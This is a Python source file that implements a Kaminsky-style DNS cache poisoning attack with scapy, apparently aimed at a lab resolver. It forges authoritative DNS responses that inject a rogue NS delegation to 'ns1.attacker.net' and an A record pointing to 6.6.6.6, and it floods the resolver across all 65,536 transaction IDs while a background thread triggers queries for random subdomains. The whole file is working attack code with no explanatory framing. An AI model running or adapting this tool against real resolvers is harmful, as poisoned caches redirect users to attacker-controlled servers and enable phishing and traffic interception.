import threading
import time
from dataclasses import dataclass

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send

from attack_utils import (
    discover_query_context,
    extract_parent_domain,
    fqdn,
    random_subdomain,
    resolve_authoritative_server_ip,
    trigger_resolver_query,
)


@dataclass
class KaminskyAttackConfig:
    target_domain: str
    resolver_ip: str = "172.28.0.10"
    resolver_port: int | None = None
    default_resolver_port: int = 5300
    auth_server_ip: str | None = None
    bootstrap_resolver: str | None = None
    spoofed_ip: str = "6.6.6.6"
    delegated_domain: str | None = None
    delegated_ns: str = "ns1.attacker.net"
    delegated_ns_ip: str = "6.6.6.6"
    attempts: int = 1
    txid_start: int = 0
    txid_count: int = 65536
    ttl: int = 300
    query_timeout: float = 1.0
    pre_flood_delay: float = 0.02
    inter_packet_delay: float = 0.0
    inter_attempt_delay: float = 0.1
    iface: str | None = None
    discovery_timeout: float = 3.0
    discover: bool = False


def craft_spoofed_response(
    resolver_ip: str,
    resolver_port: int,
    auth_server_ip: str,
    query_name: str,
    spoofed_ip: str,
    txid: int,
    delegated_domain: str | None = None,
    delegated_ns: str = "ns1.attacker.net",
    delegated_ns_ip: str = "6.6.6.6",
    ttl: int = 300,
):
    query_fqdn = fqdn(query_name)
    delegated_zone = fqdn(delegated_domain or extract_parent_domain(query_name))
    delegated_ns_fqdn = fqdn(delegated_ns)

    answer = DNSRR(rrname=query_fqdn, type="A", ttl=ttl, rdata=spoofed_ip)
    authority = DNSRR(rrname=delegated_zone, type="NS", ttl=ttl, rdata=delegated_ns_fqdn)
    additional = DNSRR(rrname=delegated_ns_fqdn, type="A", ttl=ttl, rdata=delegated_ns_ip)

    dns = DNS(
        id=txid,
        qr=1,
        aa=1,
        rd=0,
        ra=0,
        qdcount=1,
        ancount=1,
        nscount=1,
        arcount=1,
        qd=DNSQR(qname=query_fqdn, qtype="A"),
        an=answer,
        ns=authority,
        ar=additional,
    )
    return IP(src=auth_server_ip, dst=resolver_ip) / UDP(sport=53, dport=resolver_port) / dns


def send_spoof_flood(
    *,
    resolver_ip: str,
    resolver_port: int,
    auth_server_ip: str,
    query_name: str,
    spoofed_ip: str,
    txid_start: int,
    txid_count: int,
    delegated_domain: str | None,
    delegated_ns: str,
    delegated_ns_ip: str,
    ttl: int,
    inter_packet_delay: float,
) -> tuple[int, float]:
    batch_size = 2048
    progress_interval_seconds = 1.0
    started_at = time.perf_counter()
    last_report_at = started_at
    last_report_count = 0
    sent_packets = 0
    batch = []

    for txid in range(txid_start, txid_start + txid_count):
        batch.append(
            craft_spoofed_response(
                resolver_ip=resolver_ip,
                resolver_port=resolver_port,
                auth_server_ip=auth_server_ip,
                query_name=query_name,
                spoofed_ip=spoofed_ip,
                txid=txid,
                delegated_domain=delegated_domain,
                delegated_ns=delegated_ns,
                delegated_ns_ip=delegated_ns_ip,
                ttl=ttl,
            )
        )
        if len(batch) < batch_size:
            continue

        send(batch, verbose=False, inter=inter_packet_delay)
        sent_packets += len(batch)
        batch.clear()

        now = time.perf_counter()
        if now - last_report_at >= progress_interval_seconds:
            total_elapsed = max(now - started_at, 1e-9)
            window_elapsed = max(now - last_report_at, 1e-9)
            window_packets = sent_packets - last_report_count
            print(
                f"flood_progress sent={sent_packets}/{txid_count} "
                f"elapsed_seconds={total_elapsed:.3f} "
                f"avg_packets_per_second={sent_packets / total_elapsed:.1f} "
                f"window_packets_per_second={window_packets / window_elapsed:.1f}",
                flush=True,
            )
            last_report_at = now
            last_report_count = sent_packets

    if batch:
        send(batch, verbose=False, inter=inter_packet_delay)
        sent_packets += len(batch)

    elapsed_seconds = max(time.perf_counter() - started_at, 1e-9)
    return sent_packets, elapsed_seconds


def run_attack(config: KaminskyAttackConfig) -> None:
    auth_server_ip = config.auth_server_ip
    resolver_port = config.resolver_port

    if config.discover:
        probe_name = random_subdomain(config.target_domain)
        context = discover_query_context(
            probe_name,
            resolver_ip=config.resolver_ip,
            iface=config.iface,
            timeout=config.discovery_timeout,
        )
        auth_server_ip = auth_server_ip or context["auth_server_ip"]
        resolver_port = resolver_port or context["resolver_port"]
        print(
            "discovered upstream context:",
            f"auth_server_ip={auth_server_ip}",
            f"resolver_port={resolver_port}",
            f"probe_qname={probe_name}",
            flush=True,
        )
    else:
        if auth_server_ip is None:
            context = resolve_authoritative_server_ip(
                config.target_domain,
                bootstrap_resolver=config.bootstrap_resolver,
            )
            auth_server_ip = context["auth_server_ip"]
            print(
                "resolved authoritative server:",
                f"zone={context['zone']}",
                f"ns_name={context['ns_name']}",
                f"auth_server_ip={auth_server_ip}",
                flush=True,
            )
        if resolver_port is None:
            resolver_port = config.default_resolver_port
            print(
                "using assumed resolver source port:",
                f"resolver_port={resolver_port}",
                flush=True,
            )

    for attempt in range(config.attempts):
        query_name = random_subdomain(config.target_domain)
        worker = threading.Thread(
            target=trigger_resolver_query,
            args=(query_name, config.resolver_ip, config.query_timeout),
            daemon=True,
        )
        worker.start()
        time.sleep(config.pre_flood_delay)

        packet_count, flood_elapsed_seconds = send_spoof_flood(
            resolver_ip=config.resolver_ip,
            resolver_port=resolver_port,
            auth_server_ip=auth_server_ip,
            query_name=query_name,
            spoofed_ip=config.spoofed_ip,
            txid_start=config.txid_start,
            txid_count=config.txid_count,
            delegated_domain=config.delegated_domain,
            delegated_ns=config.delegated_ns,
            delegated_ns_ip=config.delegated_ns_ip,
            ttl=config.ttl,
            inter_packet_delay=config.inter_packet_delay,
        )
        worker.join(timeout=config.query_timeout + 0.2)
        packets_per_second = packet_count / flood_elapsed_seconds
        print(
            f"[attempt {attempt + 1}/{config.attempts}] qname={query_name} "
            f"flooded_packets={packet_count} auth_server_ip={auth_server_ip} "
            f"resolver_port={resolver_port} flood_elapsed_seconds={flood_elapsed_seconds:.3f} "
            f"packets_per_second={packets_per_second:.1f}",
            flush=True,
        )
        if config.inter_attempt_delay:
            time.sleep(config.inter_attempt_delay)
